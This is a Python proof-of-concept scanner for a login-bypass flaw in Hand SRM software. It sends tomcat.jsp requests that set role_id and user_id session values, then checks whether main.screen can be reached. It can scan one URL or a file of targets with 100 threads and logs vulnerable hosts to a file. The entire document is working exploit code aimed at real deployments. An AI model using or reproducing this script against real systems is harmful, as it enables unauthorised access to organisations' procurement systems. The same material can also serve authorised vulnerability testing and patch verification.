import sys, argparse, requests, re, time

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei   
    

    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload1 = "/tomcat.jsp?dataName=role_id&dataValue=1"
    payload2 = "/tomcat.jsp?dataName=user_id&dataValue=1"
    payload3 = "//main.screen"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/58.0.3029.110 Safari/537.36",
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res1 = requests.get(url=target + payload1, headers=headers, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload2, headers=headers, verify=False)
            if res2.status_code == 200:
                res3 = requests.get(url=target + payload3, headers=headers, verify=False)
                if res3.status_code == 200:
                    print(f"[+] {target} 存在漏洞")
                    with open('handere.txt', 'a', encoding='utf-8') as f:
                        f.write(target + '\n')
                else:
                    print(f"[-] {target} 漏洞不存在")
    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


if __name__ == '__main__':
    main()
